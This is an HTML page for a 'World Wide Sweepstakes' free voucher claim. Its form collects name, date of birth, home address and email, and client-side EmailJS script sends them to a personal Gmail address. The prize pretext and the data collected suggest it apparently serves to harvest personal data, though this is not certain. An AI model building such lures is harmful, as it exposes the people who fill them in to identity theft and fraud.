<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>World Wide Sweepstakes – Free Voucher Redeem</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #f4f6f9;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem 1rem;
    }
    .card {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
      max-width: 500px;
      width: 100%;
      padding: 2.5rem 2rem;
    }
    .logo-wrap { text-align: center; margin-bottom: 1 rem; }
    .logo-wrap img { max-width: 240px; width: 100%; }
    .heading { text-align: center; font-size: 1.2rem; font-weight: 700; color: #1a1a2e; margin-bottom: 0.2rem; }
    .subheading { text-align: center; font-size: 0.9rem; color: #888; margin-bottom: 1.75rem; }
    .form-group { margin-bottom: 1.1rem; }
    label { display: block; font-size: 0.82rem; font-weight: 600; color: #444; margin-bottom: 0.35rem; }
    input, textarea {
      width: 100%; padding: 0.7rem 0.9rem;
      border: 1.5px solid #dde1e9; border-radius: 8px;
      font-size: 0.93rem; color: #222; background: #fafbfc;
      transition: border-color 0.2s; outline: none;
      font-family: inherit;
    }
    input:focus, textarea:focus { border-color: #c0392b; background: #fff; }
    textarea { resize: vertical; min-height: 80px; }
    .divider { height: 1px; background: #eee; margin: 1.25rem 0; }
    .section-label {
      font-size: 0.78rem; font-weight: 700; color: #c0392b;
      text-transform: uppercase; letter-spacing: 0.07em;
      margin-bottom: 0.9rem;
    }
    .submit-btn {
      width: 100%; padding: 0.85rem;
      background: linear-gradient(90deg, #a93226, #e74c3c, #a93226);
      background-size: 200% auto;
      color: #fff; font-size: 1rem; font-weight: 700;
      border: none; border-radius: 8px; cursor: pointer; margin-top: 0.75rem;
      letter-spacing: 0.02em;
      transition: background-position 0.4s, opacity 0.2s;
    }
    .submit-btn:hover { background-position: right center; opacity: 0.92; }
    .success-msg {
      display: none; text-align: center; color: #2d7a3a;
      font-weight: 600; font-size: 1rem; margin-top: 1rem;
      padding: 0.75rem; background: #eafaf0; border-radius: 8px;
    }
    .footer-note { text-align: center; font-size: 0.72rem; color: #bbb; margin-top: 1.5rem; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo-wrap">
      <img src="Image.PNG" alt="World Wide Sweepstakes Logo">
    </div>
    
    <div class="heading">Free Voucher Redemption</div>
    <div class="subheading">Please fill out your details below to claim.</div>
    
    <form id="voucherForm">
      <div class="section-label">Personal Info</div>
      
      <div class="form-group">
        <label for="name">Full Name</label>
        <input type="text" id="name" placeholder="John Doe" required/>
      </div>
      <div class="form-group">
        <label for="dob">Date of Birth</label>
        <input type="date" id="dob" required/>
      </div>

      <div class="section-label">Contact & Shipping</div>
      
      <div class="form-group">
        <label for="street">Street Address</label>
        <input type="text" id="street" placeholder="123 Main St" required/>
      </div>
      
      <div class="form-group">
        <label for="address2">Address Line 2</label>
        <input type="text" id="address2" placeholder="Apartment, suite, unit, building, floor, etc. (optional)"/>
      </div>
      
      <div class="form-group" style="display: flex; gap: 10px;">
        <div style="flex: 2;">
          <label for="city">City</label>
          <input type="text" id="city" placeholder="City" required/>
        </div>
        <div style="flex: 1;">
          <label for="state">State</label>
          <input type="text" id="state" placeholder="State" required/>
        </div>
        <div style="flex: 1;">
          <label for="zip">ZIP Code</label>
          <input type="text" id="zip" placeholder="ZIP Code" required/>
        </div>
      </div>
      
      <div class="form-group">
        <label for="email">Email Address</label>
        <input type="email" id="email" placeholder="john@example.com" required/>
      </div>

      <div class="divider"></div>
      <p class="section-label">Voucher Redemption</p>
      
      <div class="form-group">
        <label for="location">Location Where You Will Redeem Voucher</label>
        <input type="text" id="location" placeholder="e.g. New York, NY" required/>
      </div>

      <div class="divider"></div>
      
      <div class="form-group">
        <label for="notes">Any Notes or Comments? (Optional)</label>
        <textarea id="notes" placeholder="Let us know if you have special instructions..."></textarea>
      </div>
      
      <button type="submit" class="submit-btn">🎟️ Redeem My Voucher</button>
      <div class="success-msg" id="successMsg">
        🎉 Success! Your details have been submitted.
      </div>
    </form>
    <p class="footer-note">&copy; 2026 World Wide Sweepstakes. All rights reserved.</p>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script>
    emailjs.init('4ve4-5FuEVsGrVVdq');
    
    document.getElementById('voucherForm').addEventListener('submit', function(e) {
      e.preventDefault();
      
      const btn = document.querySelector('.submit-btn');
      btn.textContent = 'Submitting...';
      btn.disabled = true;
      
      // Formatting the Address Line 2 so it doesn't leave an awkward space if left empty
      const addressLine2 = document.getElementById('address2').value ? ' ' + document.getElementById('address2').value : '';
      const fullAddress = document.getElementById('street').value + addressLine2 + ', ' + 
                          document.getElementById('city').value + ', ' + 
                          document.getElementById('state').value + ' ' + 
                          document.getElementById('zip').value;

      const templateParams = {
        name:     document.getElementById('name').value,
        dob:      document.getElementById('dob').value,
        address:  fullAddress,
        email:    document.getElementById('email').value,
        location: document.getElementById('location').value,
        notes:    document.getElementById('notes').value,
        to_email: 'customskillgames@gmail.com'
      };
      
      emailjs.send('service_e32jlp7', 'template_f5gstp8', templateParams)
        .then(() => {
          document.getElementById('successMsg').style.display = 'block';
          document.getElementById('voucherForm').reset();
          btn.textContent = '🎟️ Redeem My Voucher';
          btn.disabled = false;
        })
        .catch((err) => {
          alert('Something went wrong. Please try again.');
          console.error(err);
          btn.textContent = '🎟️ Redeem My Voucher';
          btn.disabled = false;
        });
    });
  </script>
</body>
</html>
